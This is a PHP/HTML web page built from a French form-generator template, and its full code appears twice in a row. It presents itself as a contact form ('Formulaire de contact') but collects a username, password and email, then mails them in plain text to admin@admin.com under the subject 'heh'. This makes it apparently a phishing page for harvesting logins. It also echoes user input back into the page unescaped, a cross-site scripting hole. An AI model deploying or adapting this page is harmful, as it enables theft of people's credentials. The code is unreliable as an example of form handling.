<?php

// On vérifie si la fonction ini_set() a été désactivée...
$desactive = ini_get('disable_functions');
if (preg_match("/ini_set/i", "$desactive") == 0) {
// Si elle n'est pas désactivée, on définit ini_set de manière à n'afficher que les erreurs...
ini_set("error_reporting" , "E_ALL & ~E_NOTICE");
}

// Vérifier que le formulaire a été envoyé...
if (isset($_POST['envoi'])) {


//On commence une session pour enregistrer les variables du formulaire...

session_start();

$_SESSION['champ1'] = $_POST['champ1'];
$_SESSION['champ2'] = $_POST['champ2'];
$_SESSION['zone_email1'] = $_POST['zone_email1'];

//Evaluation du bouton 1 ...
switch($_POST['bouton1']) {
case "rt":
$_SESSION['bouton1'] = "rt";
break;
default:
$_SESSION['bouton1'] = "";
} // Fin du switch...

// Définir l\'icone apparaissant en cas d\'erreur...


// Définir sur 0 pour afficher un petit x de couleur rouge.
// Définir sur 1 pour afficher l\'image d\'une croix rouge telle que celle utilisée dans l\'assistant
// Si vous utilisez l\'option 1, l\'image de la croix rouge \'icone.gif\' doit se trouver dans le répertoire \'images\',
// ce dernier devant se trouver au même niveau que votre formulaire...
$flag_icone = 0;

// On vérifie si $flag_icone est défini sur 0 ou 1...
if ($flag_icone == 0) {
$icone = "<b><font size=\"3\" face=\"Arial, Verdana, Helvetica, sans-serif\" color=\"#CC0000\">x</font></b>";
} else {
$icone = "<img src=\"images/icone.gif\"";
}

// Définir l'indicateur d'erreur sur zéro...
$flag_erreur = 0;
// N'envoyer le formulaire que s'il n'y a pas d'erreurs...
if ($flag_erreur == 0) {					

// Addresse de réception du formulaire
$email_dest = "admin@admin.com";
$sujet = "heh";
$entetes ="MIME-Version: 1.0 \n";
	$entetes .="From: dzd<zrz>\n";
	$entetes .="Return-Path: dzd<zrz>\n";
	$entetes .="Reply-To: dzd<zrz>\n";
	$entetes .="Content-Type: text/html; charset=iso-8859-1 \n";
	$partie_entete = "<html>\n<head>\n<title>Formulaire</title>\n<meta http-equiv=Content-Type content=text/html; charset=iso-8859-1>\n</head>\n<body bgcolor=#FFFFFF>\n";


//Partie HTML de l'e-mail...
$partie_champs_texte .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">Username = " . $_SESSION['champ1'] . "</font><br>\n";
$partie_champs_texte .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">password = " . $_SESSION['champ2'] . "</font><br>\n";
$partie_zone_email .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">email = " . $_SESSION['zone_email1'] . "</font><br>\n";
$partie_boutons .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">view = " . $_SESSION['bouton1'] . "</font><br>\n";
					

					// Fin du message HTML
					$fin = "</body></html>\n\n";
					
					$sortie = $partie_entete . $partie_champs_texte . $partie_zone_email . $partie_listes . $partie_boutons . $partie_cases . $partie_zone_texte . $fin;


					// Send the e-mail
					if (@!mail($email_dest,$sujet,$sortie,$entetes)) {
					echo("Envoi du formulaire impossible");
					exit();
					} else {

                    // Rediriger vers la page de remerciement
                    header("Location:form");
                    exit();
                  } // Fin else
			    } // Fin du if ($flag_erreur == 0) {
			} // Fin de if POST
?>
<html>
<!-- 
Assistant de création de formulaires PHP pour les nuls - Version gratuite 1.6
Auteur : Frédéric Ménard (assistant@f1-fantasy.net)
Site : http://www.f1-fantasy.net/assistant
 -->
<head>
<title>Formulaire</title><script language="JavaScript">


function verifSelection() {


if (document.mail_form.champ1.value == "") {
alert("enter username")
return false
} 

if (document.mail_form.champ2.value == "") {
alert("enter password")
return false
} 

if (document.mail_form.zone_email1.value == "") {
alert("enter your email-_-")
return false
}

invalidChars = " /:,;'"

for (i=0; i < invalidChars.length; i++) {	// does it contain any invalid characters?
badChar = invalidChars.charAt(i)

if (document.mail_form.zone_email1.value.indexOf(badChar,0) > -1) {
alert("Votre adresse e-mail contient des caractères invalides. Veuillez vérifier.")
document.mail_form.zone_email1.focus()
return false
}
}

atPos = document.mail_form.zone_email1.value.indexOf("@",1)			// there must be one "@" symbol
if (atPos == -1) {
alert('Votre adresse e-mail ne contient pas le signe "@". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

if (document.mail_form.zone_email1.value.indexOf("@",atPos+1) != -1) {	// and only one "@" symbol
alert('Il ne doit y avoir qu\'un signe "@". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

periodPos = document.mail_form.zone_email1.value.indexOf(".",atPos)

if (periodPos == -1) {					// and at least one "." after the "@"
alert('Vous avez oublié le point "." après le signe "@". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

if (periodPos+3 > document.mail_form.zone_email1.value.length)	{		// must be at least 2 characters after the 
alert('Il doit y avoir au moins deux caractères après le signe ".". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

} // Fin de la fonction
</script>


</head><body><form name="mail_form" method="post" action="<?=$_SERVER['PHP_SELF']?>" onSubmit="return verifSelection()">
  <div align="center"><font size="2" face="Verdana, Arial, Helvetica, sans-serif, Tahoma"><strong>Formulaire
    de contact</strong></font></div><br><table align="center" width="566" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td height="16"><div align="center">
  <font color="#CC0000" size="2" face="Verdana, Arial, Helvetica, sans-serif, Tahoma"><strong><?php
if ($erreur_champ1) {
	  echo(stripslashes($erreur_champ1));
	  } else {
if ($erreur_champ2) {
	  echo(stripslashes($erreur_champ2));
	  } else {
if ($erreur_email1) {
	  echo(stripslashes($erreur_email1));
	  } else {
if ($erreur_bouton1) {
	  echo(stripslashes($erreur_bouton1));
	  } else {
} // Fin du else...
} // Fin du else...
} // Fin du else...
} // Fin du else...
?>
    </strong></font>
    </div></td>
      </tr>
    </table>
<p align="center"></p><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">Username</font></div></td>
	  <td align="center" valign="middle" width="30">
      <?php
	  if ($erreur_champ1) {
	  echo($icone);
	  }
	  ?>
      </td>
      <td><input name="champ1" type="text" value="<?=stripslashes($_SESSION['champ1']);?>"></td>
    </tr></table><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">password</font></div></td>
	  <td align="center" valign="middle" width="30">
      <?php
	  if ($erreur_champ2) {
	  echo($icone);
	  }
	  ?>
      </td>
      <td><input name="champ2" type="text" value="<?=stripslashes($_SESSION['champ2']);?>"></td>
    </tr></table><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">email</font></div></td>
      <td width="30" align="center" valign="middle">
	  <?php
	  if ($erreur_email1) {
	  echo($icone);
	  }
	  ?>
	  </td>
      <td><input name="zone_email1" type="text" value="<?=stripslashes($_SESSION['zone_email1']);?>"></td>
    </tr></table><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">view</font></div></td>
      <td width="30" align="center" valign="middle">
	  <?php
	  if ($erreur_bouton1) {
	  echo($icone);
	  }
	  ?>
	  </td>
      <td><input type="radio" name="bouton1" value="rt"<?php
if ($_SESSION['bouton1'] == "rt") {
echo(" checked");
}
?>><font face="Verdana" size="2">rt</font></td></tr></table><table width="566" border="0" align="center"><tr>
<td valign="top"><div align="center"> 
          <input type="reset" name="Reset" value=" Effacer ">
            
          <input type="submit" name="envoi" value="Envoyer">
        </div></td></tr></table><div align="center"><input name="nbre_fichiers" type="hidden" id="nbre_fichiers" value=""></div></form></body></html> 
        





        <?php

// On vérifie si la fonction ini_set() a été désactivée...
$desactive = ini_get('disable_functions');
if (preg_match("/ini_set/i", "$desactive") == 0) {
// Si elle n'est pas désactivée, on définit ini_set de manière à n'afficher que les erreurs...
ini_set("error_reporting" , "E_ALL & ~E_NOTICE");
}

// Vérifier que le formulaire a été envoyé...
if (isset($_POST['envoi'])) {


//On commence une session pour enregistrer les variables du formulaire...

session_start();

$_SESSION['champ1'] = $_POST['champ1'];
$_SESSION['champ2'] = $_POST['champ2'];
$_SESSION['zone_email1'] = $_POST['zone_email1'];

//Evaluation du bouton 1 ...
switch($_POST['bouton1']) {
case "rt":
$_SESSION['bouton1'] = "rt";
break;
default:
$_SESSION['bouton1'] = "";
} // Fin du switch...

// Définir l\'icone apparaissant en cas d\'erreur...


// Définir sur 0 pour afficher un petit x de couleur rouge.
// Définir sur 1 pour afficher l\'image d\'une croix rouge telle que celle utilisée dans l\'assistant
// Si vous utilisez l\'option 1, l\'image de la croix rouge \'icone.gif\' doit se trouver dans le répertoire \'images\',
// ce dernier devant se trouver au même niveau que votre formulaire...
$flag_icone = 0;

// On vérifie si $flag_icone est défini sur 0 ou 1...
if ($flag_icone == 0) {
$icone = "<b><font size=\"3\" face=\"Arial, Verdana, Helvetica, sans-serif\" color=\"#CC0000\">x</font></b>";
} else {
$icone = "<img src=\"images/icone.gif\"";
}

// Définir l'indicateur d'erreur sur zéro...
$flag_erreur = 0;
// N'envoyer le formulaire que s'il n'y a pas d'erreurs...
if ($flag_erreur == 0) {					

// Addresse de réception du formulaire
$email_dest = "admin@admin.com";
$sujet = "heh";
$entetes ="MIME-Version: 1.0 \n";
	$entetes .="From: dzd<zrz>\n";
	$entetes .="Return-Path: dzd<zrz>\n";
	$entetes .="Reply-To: dzd<zrz>\n";
	$entetes .="Content-Type: text/html; charset=iso-8859-1 \n";
	$partie_entete = "<html>\n<head>\n<title>Formulaire</title>\n<meta http-equiv=Content-Type content=text/html; charset=iso-8859-1>\n</head>\n<body bgcolor=#FFFFFF>\n";


//Partie HTML de l'e-mail...
$partie_champs_texte .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">Username = " . $_SESSION['champ1'] . "</font><br>\n";
$partie_champs_texte .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">password = " . $_SESSION['champ2'] . "</font><br>\n";
$partie_zone_email .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">email = " . $_SESSION['zone_email1'] . "</font><br>\n";
$partie_boutons .= "<font face=\"Verdana\" size=\"2\" color=\"#003366\">view = " . $_SESSION['bouton1'] . "</font><br>\n";
					

					// Fin du message HTML
					$fin = "</body></html>\n\n";
					
					$sortie = $partie_entete . $partie_champs_texte . $partie_zone_email . $partie_listes . $partie_boutons . $partie_cases . $partie_zone_texte . $fin;


					// Send the e-mail
					if (@!mail($email_dest,$sujet,$sortie,$entetes)) {
					echo("Envoi du formulaire impossible");
					exit();
					} else {

                    // Rediriger vers la page de remerciement
                    header("Location:form");
                    exit();
                  } // Fin else
			    } // Fin du if ($flag_erreur == 0) {
			} // Fin de if POST
?>    







<script language="JavaScript">


function verifSelection() {


if (document.mail_form.champ1.value == "") {
alert("enter username")
return false
} 

if (document.mail_form.champ2.value == "") {
alert("enter password")
return false
} 

if (document.mail_form.zone_email1.value == "") {
alert("enter your email-_-")
return false
}

invalidChars = " /:,;'"

for (i=0; i < invalidChars.length; i++) {	// does it contain any invalid characters?
badChar = invalidChars.charAt(i)

if (document.mail_form.zone_email1.value.indexOf(badChar,0) > -1) {
alert("Votre adresse e-mail contient des caractères invalides. Veuillez vérifier.")
document.mail_form.zone_email1.focus()
return false
}
}

atPos = document.mail_form.zone_email1.value.indexOf("@",1)			// there must be one "@" symbol
if (atPos == -1) {
alert('Votre adresse e-mail ne contient pas le signe "@". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

if (document.mail_form.zone_email1.value.indexOf("@",atPos+1) != -1) {	// and only one "@" symbol
alert('Il ne doit y avoir qu\'un signe "@". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

periodPos = document.mail_form.zone_email1.value.indexOf(".",atPos)

if (periodPos == -1) {					// and at least one "." after the "@"
alert('Vous avez oublié le point "." après le signe "@". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

if (periodPos+3 > document.mail_form.zone_email1.value.length)	{		// must be at least 2 characters after the 
alert('Il doit y avoir au moins deux caractères après le signe ".". Veuillez vérifier.')
document.mail_form.zone_email1.focus()
return false
}

} // Fin de la fonction
</script>





<form name="mail_form" method="post" action="<?=$_SERVER['PHP_SELF']?>" onSubmit="return verifSelection()">
  <div align="center"><font size="2" face="Verdana, Arial, Helvetica, sans-serif, Tahoma"><strong>Formulaire
    de contact</strong></font></div><br><table align="center" width="566" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td height="16"><div align="center">
  <font color="#CC0000" size="2" face="Verdana, Arial, Helvetica, sans-serif, Tahoma"><strong><?php
if ($erreur_champ1) {
	  echo(stripslashes($erreur_champ1));
	  } else {
if ($erreur_champ2) {
	  echo(stripslashes($erreur_champ2));
	  } else {
if ($erreur_email1) {
	  echo(stripslashes($erreur_email1));
	  } else {
if ($erreur_bouton1) {
	  echo(stripslashes($erreur_bouton1));
	  } else {
} // Fin du else...
} // Fin du else...
} // Fin du else...
} // Fin du else...
?>
    </strong></font>
    </div></td>
      </tr>
    </table>
<p align="center"></p><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">Username</font></div></td>
	  <td align="center" valign="middle" width="30">
      <?php
	  if ($erreur_champ1) {
	  echo($icone);
	  }
	  ?>
      </td>
      <td><input name="champ1" type="text" value="<?=stripslashes($_SESSION['champ1']);?>"></td>
    </tr></table><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">password</font></div></td>
	  <td align="center" valign="middle" width="30">
      <?php
	  if ($erreur_champ2) {
	  echo($icone);
	  }
	  ?>
      </td>
      <td><input name="champ2" type="text" value="<?=stripslashes($_SESSION['champ2']);?>"></td>
    </tr></table><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">email</font></div></td>
      <td width="30" align="center" valign="middle">
	  <?php
	  if ($erreur_email1) {
	  echo($icone);
	  }
	  ?>
	  </td>
      <td><input name="zone_email1" type="text" value="<?=stripslashes($_SESSION['zone_email1']);?>"></td>
    </tr></table><table width="566" border="0" align="center"><tr>
      <td width="140"><div align="right"><font face="Verdana" size="2">view</font></div></td>
      <td width="30" align="center" valign="middle">
	  <?php
	  if ($erreur_bouton1) {
	  echo($icone);
	  }
	  ?>
	  </td>
      <td><input type="radio" name="bouton1" value="rt"<?php
if ($_SESSION['bouton1'] == "rt") {
echo(" checked");
}
?>><font face="Verdana" size="2">rt</font></td></tr></table><table width="566" border="0" align="center"><tr>
<td valign="top"><div align="center"> 
          <input type="reset" name="Reset" value=" Effacer ">
            
          <input type="submit" name="envoi" value="Envoyer">
        </div></td></tr></table><div align="center"><input name="nbre_fichiers" type="hidden" id="nbre_fichiers" value=""></div></form>